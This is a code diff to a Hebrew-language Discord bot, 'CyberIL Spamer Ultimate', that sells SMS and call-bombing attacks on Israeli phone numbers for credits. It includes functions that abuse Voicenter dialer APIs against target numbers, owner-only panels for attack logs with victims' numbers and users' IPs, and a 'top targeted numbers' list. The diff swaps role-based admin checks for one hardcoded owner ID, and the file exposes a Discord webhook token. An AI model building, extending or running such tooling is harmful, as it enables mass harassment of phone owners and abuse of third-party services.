@@ -23,7 +23,7 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1486446745352146974/1gfqdmemwPDO
 PANEL_CHANNEL = 1481957038241353779
 GIFT_CHANNEL = 1485104425625325709
 
-ADMIN_ROLE_ID = 1480762750052601886
+OWNER_ID = 589866832069132308  # ה-ID שלך - החלף לזה הנכון
 
 COOLDOWN_TIME = 20
 MAX_CREDIT_SPEND = 100
@@ -178,8 +178,8 @@ async def check_cooldown(target: str):
 async def apply_cooldown(target: str):
     await cooldown_collection.update_one({"target": target}, {"$set": {"last_attempt": time.time()}}, upsert=True)
 
-def is_admin(interaction: discord.Interaction) -> bool:
-    return ADMIN_ROLE_ID in [role.id for role in interaction.user.roles]
+def is_owner(interaction: discord.Interaction) -> bool:
+    return interaction.user.id == OWNER_ID
 
 async def save_log(user_id: int, username: str, phone: str, cost: int, success: int, failed: int, duration: int, ip: str):
     entry = {
@@ -268,8 +268,8 @@ async def voicenter_click2call(session, phone):
     tag = "voicenter_click2call"
     formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
     payload = {
-        "code": "YOUR_VOICENTER_CODE",  # צריך להחליף בקוד אמיתי
-        "phone": "YOUR_AGENT_PHONE",    # צריך להחליף במספר שלוחה
+        "code": "YOUR_VOICENTER_CODE",
+        "phone": "YOUR_AGENT_PHONE",
         "target": formatted,
         "action": "call"
     }
@@ -280,8 +280,8 @@ async def voicenter_dialer_addcall(session, phone):
     tag = "voicenter_dialer"
     formatted = f"+972{phone[1:]}" if phone.startswith("0") else f"+972{phone}"
     payload = {
-        "Code": "YOUR_VOICENTER_CODE",  # צריך להחליף בקוד אמיתי
-        "Campaign": "YOUR_CAMPAIGN_CODE",  # צריך להחליף בקוד קמפיין
+        "Code": "YOUR_VOICENTER_CODE",
+        "Campaign": "YOUR_CAMPAIGN_CODE",
         "Target": formatted
     }
     return await send_request(session, "https://api.voicenter.com/ForwardDialer/Dialer/AddCall",
@@ -712,7 +712,7 @@ class StopAttack(discord.ui.View):
 
     @discord.ui.button(label="⏹️ עצור ספאם", style=discord.ButtonStyle.danger, emoji="⏹️", custom_id="stop_attack")
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id != self.user_id and not is_admin(interaction):
+        if interaction.user.id != self.user_id and not is_owner(interaction):
             await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
             return
         ev = active_missions.get(self.user_id)
@@ -944,7 +944,7 @@ class MainPanel(discord.ui.View):
 
     @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
     async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not is_admin(interaction):
+        if not is_owner(interaction):
             await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
             return
         await interaction.response.defer(ephemeral=True)
@@ -965,8 +965,8 @@ class MainPanel(discord.ui.View):
 
     @discord.ui.button(label="🛑 עצור הכל", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_all")
     async def stop_all_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if not is_admin(interaction):
-            await interaction.response.send_message("❌ רק אדמינים יכולים לעצור את כל המתקפות", ephemeral=True)
+        if not is_owner(interaction):
+            await interaction.response.send_message("❌ רק הבעלים יכול לעצור את כל המתקפות", ephemeral=True)
             return
         
         stopped_count = 0
@@ -1081,6 +1081,7 @@ async def on_ready():
     await client.change_presence(activity=discord.Game(name="🔥 200+ בקשות/שנייה | 150+ שירותים 🔥"))
     print(f"✅ CyberIL Spamer Ultimate פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
+    print(f"👑 Owner ID: {OWNER_ID}")
 
     now = time.time()
     expired = await lifetime_collection.find({"expires_at": {"$lt": now, "$gt": 0}}).to_list(length=None)
@@ -1123,28 +1124,12 @@ async def shutdown_handler():
     active_missions.clear()
     await client.close()
 
-@tree.command(name="credit", description="בדוק יתרת קרדיטים")
-async def cmd_credit(interaction: discord.Interaction):
-    await cmd_credits(interaction)
+# ========== פקודות Owner בלבד ==========
 
-@tree.command(name="credits", description="בדוק יתרת קרדיטים")
-@app_commands.describe(member="משתמש לבדיקה")
-async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
-    target = member or interaction.user
-    bal = await format_balance(target.id)
-    stats = await get_user_stats(target.id)
-
-    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_INFO)
-    if stats:
-        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
-        embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
-
-    await interaction.response.send_message(embed=embed)
-
-@tree.command(name="addcredit", description="[ADMIN] הוסף קרדיטים")
+@tree.command(name="addcredit", description="[OWNER] הוסף קרדיטים")
 @app_commands.describe(member="משתמש", amount="כמות")
 async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     if amount <= 0:
@@ -1158,10 +1143,10 @@ async def cmd_addcredit(interaction: discord.Interaction, member: discord.Member
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="removecredit", description="[ADMIN] הסר קרדיטים")
+@tree.command(name="removecredit", description="[OWNER] הסר קרדיטים")
 @app_commands.describe(member="משתמש", amount="כמות")
 async def cmd_removecredit(interaction: discord.Interaction, member: discord.Member, amount: int):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     if amount <= 0:
@@ -1175,10 +1160,10 @@ async def cmd_removecredit(interaction: discord.Interaction, member: discord.Mem
     embed.add_field(name="יתרה", value=new_bal, inline=True)
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="lifetime", description="[ADMIN] הענק ללא הגבלה")
+@tree.command(name="lifetime", description="[OWNER] הענק ללא הגבלה")
 @app_commands.describe(member="משתמש", duration="משך זמן (השאר ריק לקבוע)", unit="יחידת זמן (minutes/hours/days/months/forever)")
 async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member, duration: int = None, unit: str = "forever"):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     
@@ -1220,10 +1205,10 @@ async def cmd_lifetime(interaction: discord.Interaction, member: discord.Member,
     embed.add_field(name="תפוגה", value=expires_date, inline=True)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="removelifetime", description="[ADMIN] הסר ללא הגבלה")
+@tree.command(name="removelifetime", description="[OWNER] הסר ללא הגבלה")
 @app_commands.describe(member="משתמש")
 async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.defer()
@@ -1231,10 +1216,10 @@ async def cmd_removelifetime(interaction: discord.Interaction, member: discord.M
     embed = discord.Embed(title="♾️ Lifetime הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="checklifetime", description="[ADMIN] בדוק סטטוס lifetime")
+@tree.command(name="checklifetime", description="[OWNER] בדוק סטטוס lifetime")
 @app_commands.describe(member="משתמש")
 async def cmd_checklifetime(interaction: discord.Interaction, member: discord.Member):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     
@@ -1260,17 +1245,17 @@ async def cmd_checklifetime(interaction: discord.Interaction, member: discord.Me
     
     await interaction.response.send_message(embed=embed)
 
-@tree.command(name="freecredits", description="[ADMIN] שלח הודעת קרדיטים")
+@tree.command(name="freecredits", description="[OWNER] שלח הודעת קרדיטים")
 async def cmd_freecredits(interaction: discord.Interaction):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.send_message(embed=create_gift_panel(), view=FreeCoins())
 
-@tree.command(name="giveall", description="[ADMIN] תן לכולם")
+@tree.command(name="giveall", description="[OWNER] תן לכולם")
 @app_commands.describe(amount="כמות")
 async def cmd_giveall(interaction: discord.Interaction, amount: int):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
@@ -1279,6 +1264,120 @@ async def cmd_giveall(interaction: discord.Interaction, amount: int):
         return
     await users_collection.update_many({}, {"$inc": {"credits": amount}})
     await interaction.followup.send(f"✅ ניתנו {amount} קרדיטים לכולם", ephemeral=True)
+
+@tree.command(name="attacklogs", description="[OWNER] לוגים")
+@app_commands.describe(limit="כמות")
+async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
+    if not is_owner(interaction):
+        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    logs = await get_all_logs(min(limit, 50))
+
+    if not logs:
+        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
+        return
+
+    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
+    for log in logs[:10]:
+        embed.add_field(
+            name=f"{log['username']} | {log['date']} {log['time']}",
+            value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}\n🌐 {log.get('ip', 'unknown')}",
+            inline=False
+        )
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+@tree.command(name="topnumbers", description="[OWNER] מספרים מובילים")
+async def cmd_topnumbers(interaction: discord.Interaction):
+    if not is_owner(interaction):
+        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    top = await get_top_targets(10)
+
+    if not top:
+        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
+        return
+
+    embed = discord.Embed(title="🎯 מספרים מובילים", color=COLOR_INFO)
+    for i, item in enumerate(top, 1):
+        embed.add_field(
+            name=f"{i}. {item['_id']}",
+            value=f"מתקפות: {item['count']}",
+            inline=False
+        )
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+@tree.command(name="globalstats", description="[OWNER] סטטיסטיקה גלובלית")
+async def cmd_globalstats(interaction: discord.Interaction):
+    if not is_owner(interaction):
+        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+    stats = await get_global_stats()
+
+    if not stats:
+        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
+        return
+
+    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
+    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
+    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
+    embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+@tree.command(name="stopall", description="[OWNER] עצור את כל המתקפות")
+async def cmd_stopall(interaction: discord.Interaction):
+    if not is_owner(interaction):
+        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+        return
+    
+    stopped_count = 0
+    for user_id, event in list(active_missions.items()):
+        if event and not event.is_set():
+            event.set()
+            stopped_count += 1
+    
+    active_missions.clear()
+    
+    embed = discord.Embed(
+        title="🛑 כל המתקפות הופסקו",
+        description=f"הופסקו {stopped_count} מתקפות פעילות",
+        color=COLOR_SUCCESS
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@tree.command(name="restart", description="[OWNER] אתחל בוט")
+async def cmd_restart(interaction: discord.Interaction):
+    if not is_owner(interaction):
+        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
+        return
+    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
+    await shutdown_handler()
+    os.execv(sys.executable, [sys.executable] + sys.argv)
+
+# ========== פקודות לכולם ==========
+
+@tree.command(name="credits", description="בדוק יתרת קרדיטים")
+@app_commands.describe(member="משתמש לבדיקה")
+async def cmd_credits(interaction: discord.Interaction, member: discord.Member = None):
+    target = member or interaction.user
+    bal = await format_balance(target.id)
+    stats = await get_user_stats(target.id)
+
+    embed = discord.Embed(title="💎 קרדיטים", description=f"{target.mention} — **{bal}**", color=COLOR_INFO)
+    if stats:
+        embed.add_field(name="📊 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+        embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
+
+    await interaction.response.send_message(embed=embed)
 
 @tree.command(name="transfer", description="העבר קרדיטים")
 @app_commands.describe(member="מקבל", amount="כמות")
@@ -1329,9 +1428,9 @@ async def cmd_mylogs(interaction: discord.Interaction):
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="checkstatus", description="[ADMIN] בדוק סטטוס")
+@tree.command(name="checkstatus", description="[OWNER] בדוק סטטוס")
 async def cmd_checkstatus(interaction: discord.Interaction):
-    if not is_admin(interaction):
+    if not is_owner(interaction):
         await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
         return
 
@@ -1344,104 +1443,6 @@ async def cmd_checkstatus(interaction: discord.Interaction):
     embed.add_field(name="📞 סוג", value="SMS + CALL (150+ שירותים)", inline=True)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="attacklogs", description="[ADMIN] לוגים")
-@app_commands.describe(limit="כמות")
-async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
-    if not is_admin(interaction):
-        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
-        return
-
-    await interaction.response.defer(ephemeral=True)
-    logs = await get_all_logs(min(limit, 50))
-
-    if not logs:
-        await interaction.followup.send("📭 אין לוגים", ephemeral=True)
-        return
-
-    embed = discord.Embed(title="📋 לוגים אחרונים", color=COLOR_INFO)
-    for log in logs[:10]:
-        embed.add_field(
-            name=f"{log['username']} | {log['date']} {log['time']}",
-            value=f"📱 {log['phone']}\n✅ {log['success_count']} | 💎 {log['cost']}\n🌐 {log.get('ip', 'unknown')}",
-            inline=False
-        )
-
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="topnumbers", description="[ADMIN] מספרים מובילים")
-async def cmd_topnumbers(interaction: discord.Interaction):
-    if not is_admin(interaction):
-        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
-        return
-
-    await interaction.response.defer(ephemeral=True)
-    top = await get_top_targets(10)
-
-    if not top:
-        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
-        return
-
-    embed = discord.Embed(title="🎯 מספרים מובילים", color=COLOR_INFO)
-    for i, item in enumerate(top, 1):
-        embed.add_field(
-            name=f"{i}. {item['_id']}",
-            value=f"מתקפות: {item['count']}",
-            inline=False
-        )
-
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="globalstats", description="[ADMIN] סטטיסטיקה גלובלית")
-async def cmd_globalstats(interaction: discord.Interaction):
-    if not is_admin(interaction):
-        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
-        return
-
-    await interaction.response.defer(ephemeral=True)
-    stats = await get_global_stats()
-
-    if not stats:
-        await interaction.followup.send("📭 אין נתונים", ephemeral=True)
-        return
-
-    embed = discord.Embed(title="📊 סטטיסטיקה גלובלית", color=COLOR_INFO)
-    embed.add_field(name="🎯 מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
-    embed.add_field(name="👥 משתמשים", value=str(stats.get("unique_users", 0)), inline=True)
-    embed.add_field(name="💎 קרדיטים", value=str(stats.get("total_cost", 0)), inline=True)
-    embed.add_field(name="✅ בקשות", value=str(stats.get("total_success", 0)), inline=True)
-
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="stopall", description="[ADMIN] עצור את כל המתקפות")
-async def cmd_stopall(interaction: discord.Interaction):
-    if not is_admin(interaction):
-        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
-        return
-    
-    stopped_count = 0
-    for user_id, event in list(active_missions.items()):
-        if event and not event.is_set():
-            event.set()
-            stopped_count += 1
-    
-    active_missions.clear()
-    
-    embed = discord.Embed(
-        title="🛑 כל המתקפות הופסקו",
-        description=f"הופסקו {stopped_count} מתקפות פעילות",
-        color=COLOR_SUCCESS
-    )
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
-@tree.command(name="restart", description="[ADMIN] אתחל בוט")
-async def cmd_restart(interaction: discord.Interaction):
-    if not is_admin(interaction):
-        await interaction.response.send_message("❌ אין הרשאות", ephemeral=True)
-        return
-    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
-    await shutdown_handler()
-    os.execv(sys.executable, [sys.executable] + sys.argv)
 
 if __name__ == "__main__":
     try:
